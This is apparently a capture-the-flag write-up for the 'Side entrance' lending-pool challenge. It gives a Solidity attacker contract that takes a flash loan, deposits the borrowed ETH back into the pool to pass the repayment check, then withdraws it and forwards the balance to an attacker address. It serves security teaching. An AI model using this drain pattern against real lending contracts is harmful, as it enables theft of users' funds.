# Challenge #4 - Side entrance

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool

# Solution

```
contract Attacker {
    address payable attacker;

    function callFlashLoan(address _contract, address _attacker) public {
        uint256 amount = _contract.balance;
        attacker = payable(_attacker);
        SideEntrance(_contract).flashLoan(amount);
        SideEntrance(_contract).withdraw();
    }

    function execute() public payable {
        SideEntrance(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {
        // console.log("attacker before", attacker.balance);
        // console.log("balance:", address(this).balance);
        attacker.transfer(address(this).balance);
        // console.log("attacker after", attacker.balance);
    }
}
```
